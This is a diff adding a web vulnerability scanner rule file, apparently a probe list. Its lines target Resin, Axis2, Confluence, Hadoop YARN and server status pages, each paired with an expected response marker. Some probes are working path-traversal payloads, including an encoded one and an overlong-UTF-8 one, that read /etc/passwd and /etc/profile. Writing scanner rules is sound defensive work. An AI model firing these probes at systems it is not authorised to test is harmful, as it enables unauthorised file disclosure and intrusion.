@@ -1,0 +1,10 @@
+# Resin Doc
+/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/profile   {tag="/etc/profile.d/*.sh"}    {root_only}
+# /resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsp            {tag="This is the default start page for the Resin server"}    {root_only}
+/resin-admin/	  {status=200}    {tag="<title>Resin Admin Login for"}    {root_only}
+/resin-doc/examples/jndi-appconfig/test?inputFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd  {root_only}  {tag="root:x:"}
+/axis2/axis2-web/HappyAxis.jsp      {status=200}     {root_only}    {tag="Axis2 Happiness Page"}
+/spaces/viewdefaultdecorator.action?decoratorName=/  {status=200}  {root_only}   {tag="log4j.properties"}
+/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/  {status=200}  {root_only}  {tag="package-appclient.xml"}
+/ws/v1/cluster/apps/new-application  {status=200}  {root_only}  {tag="<javaClassName>javax.ws.rs.WebApplicationException"}
+/status?full=true                     {status=200}  {root_only}  {tag="Max processing time"}
